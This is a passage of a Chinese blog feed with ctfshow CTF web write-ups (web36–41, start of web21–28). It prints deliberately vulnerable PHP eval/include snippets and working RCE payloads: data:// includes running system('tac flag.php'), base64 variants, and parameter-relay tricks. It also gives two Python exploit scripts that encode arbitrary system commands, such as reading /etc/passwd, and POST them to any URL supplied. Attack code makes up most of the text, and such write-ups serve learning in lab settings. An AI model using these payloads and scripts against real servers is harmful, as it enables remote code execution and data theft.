class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac flag.php');?></p></blockquote><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac fl?g.php');?></p></blockquote><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?></p></blockquote><p><code>&lt;?= ?&gt;</code> ：是 PHP短 echo 标签</p><p>或者</p><blockquote><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><p>要按Ctrl + U看源码</p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?></p></blockquote><p>因为前面的php语句已经闭合了，所以include里的不用管</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把数字和大部分符号都禁掉了，但半角括号没禁用</p><p>仍然有好几种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// --- 方案 1: POST 参数中转执行 (最推荐，灵活) ---</span><br><span class="line">// URL: ?c=eval(pos(next(get_defined_vars())));</span><br><span class="line">// POST: 1=system(&#x27;tac flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">// --- 方案 2: 直接扫描目录并读取 flag ---</span><br><span class="line">// URL: ?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">// --- 方案 3: 替代点号的目录读取 (针对 getcwd 被过滤) ---</span><br><span class="line">// URL: ?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="利用参数中转"><a href="#利用参数中转" class="headerlink" title="利用参数中转"></a>利用参数中转</h3><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260120231551013.png" alt="image-20260120152313595"></p><ul><li>先用 <code>get_defined_vars()</code> 拿到变量池</li><li>用 <code>next</code> 定位到第二个数组(即_POST)</li><li>用 <code>pos</code>  取出代码字符串</li></ul><h3 id="直接扫描目录并读取"><a href="#直接扫描目录并读取" class="headerlink" title="直接扫描目录并读取"></a>直接扫描目录并读取</h3><blockquote><p>?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p></blockquote><ol><li><code>getcwd()</code> → 当前目录（如 <code>/var/www/html</code>）</li><li><code>scandir(getcwd())</code> → 列举目录文件，如：<code>[&quot;.&quot;, &quot;..&quot;, &quot;flag.php&quot;, &quot;index.php&quot;]</code></li><li><code>array_reverse(...)</code> → <code>[&quot;index.php&quot;, &quot;flag.php&quot;, &quot;..&quot;, &quot;.&quot;]</code></li><li><code>next(...)</code> → <code>&quot;flag.php&quot;</code></li><li><code>show_source(...)</code> → 输出 flag 内容</li></ol><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_POST[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;</span><br><span class="line">        eval(&quot;echo($c);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题难度上来了，这里贴上<a href="https://blog.csdn.net/miuzzx/article/details/108569080">官方WP</a>。</p><p>这道题过滤了大部分绕过方式，如<code>$、+、-、^、~</code>，使得<strong>异或自增和取反</strong>构造字符都无法使用，但是还剩下”|”没有过滤。所以这道题的目的就是要我们使用ascii码为0-255中没有被过滤的字符进行或运算，从而得到被绕过的字符。</p><p>下面是脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>大体意思就是<code>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</code><br>传递参数getflag<br>用法 <code>python exp.py &lt;url&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure><p>下面是整合的版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_dict</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成可用字符字典</span></span><br><span class="line"><span class="string">    优化点：使用字典(dict)存储，字符作为键，提高查询速度</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    valid_map = &#123;&#125;</span><br><span class="line">    <span class="comment"># 预编译正则，避免在循环中重复编译</span></span><br><span class="line">    preg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|\]|\&#123;|\&#125;|&amp;|-&#x27;</span>, re.I)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提前筛选出所有不匹配正则的合法字节</span></span><br><span class="line">    available_bytes = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> preg.search(<span class="built_in">chr</span>(i)):</span><br><span class="line">            available_bytes.append(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 双重循环寻找组合</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> available_bytes:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> available_bytes:</span><br><span class="line">            res_char = <span class="built_in">chr</span>(i | j)</span><br><span class="line">            <span class="comment"># 只要可见字符且尚未在字典中（或为了效率只取第一组）</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= <span class="built_in">ord</span>(res_char) &lt;= <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">if</span> res_char <span class="keyword">not</span> <span class="keyword">in</span> valid_map:</span><br><span class="line">                    valid_map[res_char] = (<span class="string">f&#x27;%<span class="subst">&#123;i:02x&#125;</span>&#x27;</span>, <span class="string">f&#x27;%<span class="subst">&#123;j:02x&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> valid_map</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">cmd, valid_map</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据命令生成 payload&quot;&quot;&quot;</span></span><br><span class="line">    p1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> valid_map:</span><br><span class="line">            p1 += valid_map[char][<span class="number">0</span>]</span><br><span class="line">            p2 += valid_map[char][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 错误：字符 &#x27;<span class="subst">&#123;char&#125;</span>&#x27; 无法通过当前规则构造&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;(&quot;<span class="subst">&#123;p1&#125;</span>&quot;|&quot;<span class="subst">&#123;p2&#125;</span>&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url, function, command, valid_map</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行 RCE 攻击&quot;&quot;&quot;</span></span><br><span class="line">    p_func = make_payload(function, valid_map)</span><br><span class="line">    p_cmd = make_payload(command, valid_map)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p_func <span class="keyword">or</span> <span class="keyword">not</span> p_cmd:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造 PHP 格式: (system)(ls)</span></span><br><span class="line">    final_payload = <span class="string">f&quot;<span class="subst">&#123;p_func&#125;</span><span class="subst">&#123;p_cmd&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 构造 Payload: <span class="subst">&#123;final_payload&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 核心：使用 unquote 将字符串形式的 %ff 转为字节</span></span><br><span class="line">        <span class="comment"># requests.post 会处理字典数据的编码</span></span><br><span class="line">        payload_raw = urllib.parse.unquote(final_payload)</span><br><span class="line">        response = requests.post(url, data=&#123;<span class="string">&#x27;c&#x27;</span>: payload_raw&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 服务器响应:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text.strip())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   PHP Non-Alphanumeric RCE Exploit (Optimized)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    valid_map = generate_dict()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 字典初始化完成，支持 <span class="subst">&#123;<span class="built_in">len</span>(valid_map)&#125;</span> 个可用字符。\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;[+] 目标 URL (例如 [http://target.com/index.php](http://target.com/index.php)): &quot;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 请输入完整的 URL&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            func = <span class="built_in">input</span>(<span class="string">&quot;\n[+] PHP 函数 (如 system, 退出请按 Ctrl+C): &quot;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> func: <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            cmd = <span class="built_in">input</span>(<span class="string">&quot;[+] 命令参数 (如 cat /etc/passwd): &quot;</span>).strip()</span><br><span class="line">            exploit(url, func, cmd, valid_map)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n\n[*] 用户退出&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260121003234706.png" alt="image-20260121003218829"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web21-28 爆破</title>
      <link href="/2026/01/17/ctfshow-web21-28/"/>
      <url>/2026/01/17/ctfshow-web21-28/</url>
      
        <content type="html"><![CDATA[<h2>web21</h2><p>随便输入账密，抓个包看看</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525669.png" alt="image-20260117180139202"></p><p>解码一下，发现我们刚才输入的账密，是以”账号:密码”格式传输的</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525670.png" alt="image-20260117180100526"></p><p>在BP导入题目给的字典，然后记得处理payload，把url编码选项关掉</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525671.png" alt="image-20260117180243241"></p><p>最后发送YWRtaW46c2hhcms2Mw&#x3D;&#x3D;，得到flag</p><h2>web22</h2><p>这道题考的是域名爆破，其实也算是信息收集</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260118011525672.png" alt="image-20260117181806227"></p><p>使用工具（如Layer），爆破域名，找到某个网址得到flag</p><p>题目已经失效</p><h2>web23</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span 